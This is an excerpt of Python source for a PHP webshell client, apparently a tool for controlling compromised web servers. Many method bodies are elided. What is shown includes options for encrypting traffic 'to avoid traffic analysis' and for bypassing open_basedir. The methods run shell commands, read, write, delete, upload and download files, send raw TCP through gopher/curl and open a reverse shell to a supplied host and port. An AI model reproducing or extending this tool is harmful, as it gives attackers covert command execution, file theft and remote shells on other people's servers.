...
php_webshell_communication_options = [
    ...
    Option(
        ...
        name="Sessionize payload",
        type="checkbox",
        placeholder="Store payload in session to reduce each request size",
        default_value=False,
        alternatives=None,
    ),
    Option(
        id="antireplay",
        name="HTTP anti-replay",
        type="checkbox",
        placeholder="Server generates random key to prevent replay attacks",
        default_value=False,
        alternatives=None,
    ),
    Option(
        ...
        type="checkbox",
        placeholder="Use RSA+AES256 to avoid traffic analysis and replay attacks",
        default_value=False,
        alternatives=None,
    ),
    Option(
        ...
        type="checkbox",
        placeholder="Bypass open_basedir restriction in php.ini",
        default_value=False,
        alternatives=None,
    ),
]
...
class PHPWebshellActions(PHPSessionInterface):
    ...
    async def execute_cmd(self, cmd: str) -> str:
        ...
        if result == "WRONG_NO_FUNCTION":
            raise exceptions.TargetError("Target does not support shell_exec")
        return result
    ...
    async def list_dir(self, dir_path: str) -> t.List[DirectoryEntry]:
        ...
        try:
            ...
            raise exceptions.PayloadOutputError("Failed to parse JSON: " + json_result) from exc
        result = [
            DirectoryEntry(
                name=item["name"],
    ...
    async def mkdir(self, dir_path: str):
        ...
        if result == "WRONG_NO_PARENT":
            raise exceptions.FileError("Parent folder does not exist")
        if result == "WRONG_EXISTS":
            raise exceptions.FileError("Target already exists")
        if result == "WRONG_NO_PERMISSION":
            raise exceptions.FileError("Permission denied to create directory")
        if result == "WRONG_UNKNOWN":
            raise exceptions.UnknownError("Failed to create directory due to unknown reason")
        if result != "OK":
            raise exceptions.UnknownError("Directory creation code execution failed")
    ...
    async def get_file_contents(
        ...
        if result == "WRONG_NOT_FILE":
            raise exceptions.FileError("Target is not a regular file")
        if result == "WRONG_NO_PERMISSION":
            raise exceptions.FileError("Permission denied to read file")
    ...
    async def put_file_contents(self, filepath: str, content: bytes) -> bool:
        ...
        if result == "WRONG_NO_PERMISSION_FOLDER":
            raise exceptions.FileError("File does not exist and cannot write into folder")
        if result == "WRONG_NOT_FILE":
            raise exceptions.FileError("Target is not a regular file")
        if result == "WRONG_NO_PERMISSION":
            raise exceptions.FileError("Permission denied to save file")
    ...
    async def delete_file(self, filepath: str) -> bool:
        ...
        if result == "WRONG_NOT_FILE":
            raise exceptions.FileError("Target is not a regular file")
        if result == "WRONG_NO_PERMISSION":
            raise exceptions.FileError("Permission denied to delete file")
        return result == "SUCCESS"
    ...
    async def move_file(self, filepath: str, new_filepath: str) -> None:
        ...
        if result == "WRONG_NO_PERMISSION":
            raise exceptions.FileError("Permission denied to move file")
        if result == "FAILED":
            raise exceptions.FileError("Move failed due to unknown reason")
        if result != "SUCCESS":
            raise exceptions.FileError("File did not report move success")
    ...
    async def copy_file(self, filepath: str, new_filepath: str) -> None:
        ...
        if result == "WRONG_NOT_EXIST":
            raise exceptions.FileError("File does not exist")
        if result == "WRONG_NO_PERMISSION":
            raise exceptions.FileError("Permission denied to copy file")
        if result == "FAILED":
            raise exceptions.FileError("Copy failed due to unknown reason")
        if result != "SUCCESS":
            raise exceptions.FileError("File did not report copy success")
    ...
    async def upload_file(
        ...
        result = await self.submit(code)
        if result == "WRONG_NO_PERMISSION":
            raise exceptions.FileError("Permission denied to write file")
        if result == "WRONG_NO_PERMISSION_DIR":
            raise exceptions.FileError("Permission denied to write folder")
        if result == "WRONG_READ_ERROR":
            raise exceptions.FileError("Cannot read uploaded temp file; maybe it was removed?")
        return result == "DONE"
    ...
    async def download_file(
        ...
        if filesize_text == "WRONG_NOT_FILE":
            raise exceptions.FileError("No such file")
        ...
        try:
            ...
            raise exceptions.PayloadOutputError(
                "Failed to get file size; printed size is not a number: " + repr(filesize_text)
            ) from exc

        if filesize is False:
            raise exceptions.PayloadOutputError(
                "File exists and readable, but failed to get size"
            )
        if not isinstance(filesize, int):
            raise exceptions.PayloadOutputError(
                "Failed to get file size; not an integer"
            )
        ...
        for i, chunk in enumerate(chunks):
            if chunk == "WRONG_NOT_FILE":
                ...
                raise exceptions.FileError("Unknown error; download failed")
            try:
                ...
                if hashlib.md5(chunk_content).hexdigest() != chunk_md5:
                    ...
                    raise exceptions.FileError(f"Download failed: chunk {i+1} MD5 mismatch")
                result += chunk_content
            except exceptions.FileError as exc:
                raise exc
            except Exception as exc:
                raise exceptions.PayloadOutputError(
                    "Decode failed; webshell returned invalid base64"
                ) from exc
    ...
    async def send_bytes_over_tcp(
        ...
        if send_method == "gopher_curl" or send_method is None:
            ...
            raise exceptions.UserError(f"TCP send method not found: {repr(send_method)}")
        code = format_phpcode(
            template,
        ...
        if result == "WRONG_NOT_SUPPORTED":
            raise exceptions.UserError(f"Target does not support TCP send method: {send_method}")
        if result == "WRONG_SEND_FAILED":
            raise exceptions.TargetRuntimeError("Target failed to send TCP")
        return base64.b64decode(result)
    ...
    async def open_reverse_shell(self, host: str, port: int) -> None:
        ...
        if result == "WRONG_NO_METHOD":
            raise exceptions.TargetError("Target does not support reverse shell functions")
    ...
    async def get_basicinfo(self) -> t.List[BasicInfoEntry]:
        ...
        try:
            ...
            raise exceptions.PayloadOutputError("Failed to parse JSON from target") from exc
    ...
    async def download_phpinfo(self) -> bytes:
        """Get current phpinfo content"""
        b64_result = await self.submit(DOWNLOAD_PHPINFO_PHP)
        try:
            return base64.b64decode(b64_result)
        except BinasciiError as exc:
            raise exceptions.PayloadOutputError("Failed to base64 decode received data") from exc
        ...
        async def wrap(payload: str) -> str:
            ...
            for payload_part in payloads:
                ...
                if result == "PAYLOAD_SESSIONIZE_UNEXIST":
                    raise exceptions.TargetRuntimeError(
                        "Payload not present in session; target may not support session"
                    )
    ...
    def antireplay_wrapper(self, submitter: Submitter) -> Submitter:
        ...
        async def wrap(payload: str) -> str:
            ...
            if result == "WRONG_NO_SESSION":
                raise exceptions.TargetRuntimeError("Anti-replay deployment failed; target does not support session")
            if result == "WRONG_BAD_KEY":
                raise exceptions.TargetRuntimeError("Anti-replay deployment failed; key mismatch")
            return result
    ...
    def encryption_wrapper(self, submitter: Submitter) -> Submitter:
        ...
        async def wrap(payload: str) -> str:
            ...
            if result_enc == "WRONG_NO_SESSION":
                self.aes_key = None
                self.aes_session_name = None
                raise exceptions.TargetRuntimeError("Target does not support session")
            ...
            try:
                ...
                raise exceptions.PayloadOutputError("Decryption failed") from exc
        ...
        if decoder["type"] == "antsword":
            if decoder["phpcode"] == "":
                raise exceptions.ServerError(
                    f"Failed to load decoder {self.decoder}; Node.js may be required"
                )
            return decoder["phpcode"]
    ...
    async def submit_unwrapped(self, payload: str) -> str:
        ...
        if status_code == 404:
            raise exceptions.TargetUnreachable(
                f"HTTP 404: webshell not found: {status_code}"
            )
        if status_code != 200:
            raise exceptions.TargetUnreachable(f"HTTP status not OK: {status_code}")
        if "POSTEXEC_FAILED" in text:
            raise exceptions.TargetRuntimeError("Payload threw an error")
        ...
        if idx_stop_r == -1:
            raise exceptions.PayloadOutputError("Cannot find output end")
